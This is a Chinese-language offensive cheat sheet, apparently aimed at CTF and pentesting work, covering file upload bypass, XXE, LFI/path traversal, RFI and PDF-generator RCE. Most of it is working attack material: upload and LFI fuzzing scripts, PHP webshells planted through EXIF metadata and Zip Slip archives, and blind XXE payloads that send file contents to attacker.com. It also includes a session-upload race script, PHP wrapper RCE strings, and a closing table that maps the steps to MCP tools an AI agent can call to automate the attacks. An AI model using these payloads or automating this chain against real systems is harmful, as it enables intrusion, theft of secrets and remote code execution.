# File Upload / XXE / LFI / Path Traversal

## 1. 文件上传绕过

### 扩展名绕过字典

```python
# 通用双扩展名 + MIME 组合 fuzz
EXT_BYPASS = [
    # 双扩展名
    "shell.php.jpg", "shell.jpg.php", "shell.php.jpeg",
    "shell.php%00.jpg", "shell.php%0d%0a.jpg",
    "shell.pHP", "shell.PHP", "shell.Php",
    # 特殊扩展名
    "shell.phtml", "shell.pht", "shell.php5", "shell.php7",
    "shell.phar", "shell.shtml", "shell.inc",
    # .htaccess 覆盖
    ".htaccess",  # AddType application/x-httpd-php .jpg
    # ASP/ASPX
    "shell.asp;.jpg", "shell.aspx;.jpg",
    "shell.cer", "shell.asa", "shell.cshtml",
    # JSP
    "shell.jsp;.jpg", "shell.jspx",
]

# 上传模板
def upload_bypass(target_url: str, file_content: bytes, filename: str):
    """自动尝试各种扩展名绕过"""
    import requests
    for ext in EXT_BYPASS:
        files = {"file": (ext, file_content, "image/jpeg")}
        r = requests.post(target_url, files=files)
        location = r.headers.get("Location", "") or r.text
        if "success" in location.lower() or r.status_code == 200:
            print(f"  [!] {ext} → OK")
```

### Content-Type 绕过

```python
MIME_BYPASS = [
    "image/jpeg", "image/png", "image/gif",
    "text/plain", "application/octet-stream",
    "application/x-php", "", None,
]
```

### 图片马 (Polyglot)

```bash
# PHP shell in JPEG EXIF
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg -o shell.jpg
# PHP shell in PNG IDAT (保留有效图片)
# 用工具: php_jpeg_shell.php, png_polyglot.py
```

### Zip Slip

```python
import zipfile, io

# 构造包含路径穿越的 zip
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    # 正常文件
    zf.writestr("innocent.txt", "hello")
    # 路径穿越 — 解压时可能覆盖敏感文件或写 shell
    zf.writestr("../../var/www/html/shell.php", '<?php system($_GET["c"]); ?>')
    zf.writestr("..\\..\\inetpub\\wwwroot\\shell.aspx", "<%@ Page Language='C#'%><%System.Diagnostics.Process.Start('cmd.exe','/c whoami');%>")

with open("zip_slip.zip", "wb") as f:
    f.write(buf.getvalue())
```

## 2. XXE (XML External Entity)

```xml
<!-- Probe 1: 文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY file SYSTEM "file:///etc/passwd">]>
<root><data>&file;</data></root>

<!-- Probe 2: 内网 SSRF -->
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&ssrf;</data></root>

<!-- Probe 3: Blind XXE (out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval SYSTEM "http://attacker.com/evil.dtd">
  %eval;
]>
<root><data>test</data></root>

<!-- evil.dtd (托管在 attacker.com) -->
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?%file;'>">
%all;

<!-- Probe 4: 通过参数实体 -->
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root><data>&exfil;</data></root>

<!-- Probe 5: SVG (图片上传场景) -->
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="file:///etc/hostname" width="100" height="100"/>
</svg>

<!-- Probe 6: DOCX/XLSX (Office 文件上传场景) -->
<!-- 修改 .docx 内 /word/document.xml 加入 XXE entity -->
```

### XXE 变种

```python
# 不同协议和编码的 Payload
XXE_PAYLOADS = [
    # 基础文件读取
    'file:///etc/passwd',
    'file:///c:/windows/win.ini',
    # PHP wrapper
    'php://filter/convert.base64-encode/resource=/var/www/html/config.php',
    'php://filter/read=convert.base64-encode/resource=index.php',
    # jar (Java)
    'jar:file:///var/www/webapp.war!/WEB-INF/web.xml',
    # netdoc (Java)
    'netdoc:///etc/passwd',
    # expect (RCE if enabled)
    'expect://id',
    # LDAP
    'ldap://attacker.com/evil',
]
```

## 3. LFI / Path Traversal

```python
# LFI fuzz 脚本
import requests, urllib.parse

LFI_PAYLOADS = [
    # 直接路径穿越
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",   # 过滤 ../ 的绕过
    "..././..././..././..././etc/passwd",  # 另一种绕过
    # Null byte (PHP < 5.3)
    "../../../../../../etc/passwd%00",
    "../../../../../../etc/passwd%00.jpg",
    # 编码绕过
    "..%2f..%2f..%2f..%2fetc%2fpasswd",   # URL 编码
    "..%252f..%252f..%252f..%252fetc%252fpasswd", # 双编码
    # 绝对路径
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    # PHP wrapper
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
    "php://input",                        # POST body 当 PHP code
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    "phar://uploads/shell.jpg/shell",
    # 日志污染 → LFI
    "../../../../../../var/log/apache2/access.log",
    "../../../../../../proc/self/environ",
    # Windows
    "../../../../../../windows/win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
]

def fuzz_lfi(target: str, param: str = "file"):
    for payload in LFI_PAYLOADS:
        # GET
        r = requests.get(target, params={param: payload})
        if any(kw in r.text for kw in ["root:", "daemon:", "[extensions]", "<?php", "WIN.INI"]):
            print(f"[!] {payload[:50]} → HIT")
        # POST
        r = requests.post(target, data={param: payload})
        if any(kw in r.text for kw in ["root:", "daemon:", "[extensions]"]):
            print(f"[!] POST {payload[:50]} → HIT")
```

### /proc 利用 (Linux)

```bash
/proc/self/environ          # 环境变量 (可能含密钥)
/proc/self/fd/0             # stdin → 可污染
/proc/self/fd/1             # stdout
/proc/self/fd/7             # 某文件句柄
/proc/self/cmdline          # 启动命令
/proc/self/maps             # 内存映射
/proc/self/status           # 进程信息
/proc/sys/kernel/random/boot_id  # 可预测值
```

### Session 文件包含

```python
# 如果 PHP session.upload_progress 开启:
# 1. 上传文件的同时，PHP 会把上传进度写入 session 文件
# 2. session 文件中包含我们控制的 filename
# 3. LFI 包含这个 session 文件 → filename 中的 PHP 代码被执行

import threading, requests

def race_session_lfi(target_url: str, lfi_param: str, php_code: str):
    """Session Upload Progress → LFI race"""
    sess = requests.Session()

    def upload_with_race():
        # 上传文件，同时设置 PHP_SESSION_UPLOAD_PROGRESS
        files = {"file": ("a.txt", "a" * 10000)}
        data = {"PHP_SESSION_UPLOAD_PROGRESS": f"<?php {php_code} ?>"}
        # 故意用慢速上传，延长窗口
        sess.post(target_url + "/upload.php", files=files, data=data)

    def lfi_race():
        # 同时尝试包含 session 文件
        while True:
            r = sess.get(target_url + "/index.php", params={
                lfi_param: "/tmp/sess_" + sess.cookies.get("PHPSESSID")
            })
            if php_code.strip("<?php >") in r.text:
                print(f"[!] RACE WON! Command output: {r.text}")
                break

    threading.Thread(target=upload_with_race).start()
    threading.Thread(target=lfi_race).start()
```

---

## 4. PHP Wrapper 全集

```python
PHP_WRAPPERS = [
    # 文件读取
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=/flag",
    "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",  # 绕过过滤
    "php://filter/zlib.deflate/resource=index.php",
    # RCE
    "php://input",                           # POST body = PHP code
    "data://text/plain,<?php system('id');?>",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
    "expect://id",                           # 需要 expect 扩展
    # PHAR 反序列化
    "phar://uploads/avatar.jpg/shell",       # phar 文件内嵌序列化对象
    # 压缩流
    "zip://uploads/archive.zip%23shell.php",
    "compress.zlib://uploads/shell.gz",
    "compress.bzip2://uploads/shell.bz2",
]
```

## 5. RFI (Remote File Inclusion)

```php
# 需要 allow_url_include=On (PHP < 7.4)
# → include('http://attacker.com/shell.txt')
# → shell.txt 中的 PHP 代码被执行

# 探测:
# ?file=http://attacker.com/test.txt
# 若 attacker.com 收到请求 → RFI 可行
```

## 6. Node.js Path Traversal Poison

```python
# Node.js 路径穿越特有手法
# 1. 编码绕过
"/../../../../../../etc/passwd"
"..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
"/..;/..;/..;/..;/..;/etc/passwd"          # Spring/Tomcat

# 2. Unicode 绕过
"/..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"
"/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"  # 全角斜线

# 3. 符号链接绕过
"/proc/self/root/../../etc/passwd"

# 4. 路径截断
"../../../../../../etc/passwd%00"
"../../../../../../etc/passwd%00.jpg"
```

## 7. XXE OOB 完整版

```xml
<!-- Blind XXE — 外带数据到攻击者服务器 -->

<!-- evil.dtd (托管在 attacker.com) -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;

<!-- 发送的 payload -->
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfil;</root>
```

## 9. 攻击链

```
文件上传 → 双扩展名绕过 → webshell → RCE → flag
文件上传 → Zip Slip → 覆盖 authorized_keys → SSH 登录
文件上传 → SVG XXE → 文件读取 → /etc/passwd + shadow
XXE Out-of-Band → 文件外带 → /flag → base64 DNS 分段传出
LFI → /proc/self/environ → 环境变量泄露 → API key/DB 密码
LFI → php://input → POST body 执行 → RCE
LFI → Session Upload Progress → 竞态包含 → PHP 代码执行
LFI → 日志污染 → User-Agent <?php ?> → access.log 包含 → RCE
RFI → 远程包含 → attacker.com/shell.txt → RCE
XXE → SSRF → 内网探测 → 内部 Admin Panel
文件上传 → .htaccess → AddType 覆盖 → 任意扩展名被执行
LFI → proc/self/fd → 文件句柄泄露 → 读取临时上传文件
```

## 10. 工具引用

```bash
# ffuf — LFI fuzzing
ffuf -u "https://target.com/index.php?file=FUZZ" \
  -w /wordlists/lfi.txt -mr "root:" -t 50

# nuclei — 模板扫描
nuclei -u https://target.com -t file/upload-xxe-lfi/ -o findings.json

# 手动 curl 批量
while read path; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com?file=$path")
  echo "$code $path"
done < lfi_wordlist.txt
```

## 11. PDF Generation RCE

### wkhtmltopdf — redirect to file://

```python
# wkhtmltopdf 跟随 HTTP redirect
# → 攻击者的 web server 返回 302 → file:///etc/passwd
# → PDF 包含 /etc/passwd 内容
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/malicious.html')
def redirect_to_file():
    return redirect('file:///etc/passwd', code=302)

# 目标: /generate-pdf?url=https://attacker.com/malicious.html
# PDF 输出 → 下载 → 看到 /etc/passwd
```

### wkhtmltopdf XSS → file:// EXFIL

```javascript
// wkhtmltopdf 默认启用 JavaScript (QtWebKit)
// HTML 页面中注入的 XSS 可以读本地文件:
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///flag', false);
xhr.send();
document.body.innerText = xhr.responseText;
// PDF 渲染后 → 页面包含 flag 内容
</script>
```

### Puppeteer / Headless Chrome PDF

```javascript
// 如果 puppeteer 运行在沙箱内 → 读 /etc/hostname 等
// 如果 --no-sandbox → 完整 RCE 可能
await page.goto('file:///etc/passwd');
await page.pdf({path: 'output.pdf'});
// output.pdf 中包含 passwd 内容
```

### wicked_pdf ERB Injection

```ruby
# Rails wicked_pdf gem 在 PDF 生成前处理 ERB
# 注入: <%= `cat /flag` %>
# → ERB 渲染时执行 → RCE
```

## Evidence

记录: 上传文件路径/扩展名、XXE 实体 payload、LFI 成功读取的文件内容前 200 字节、RFI callback IP/时间

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 文件上传/XXE/LFI 端点探测 | `http_probe` | HTTP GET 探测文件操作入口点 |
| 知识检索 | `kb_router` | 按文件攻击信号搜索知识库 |
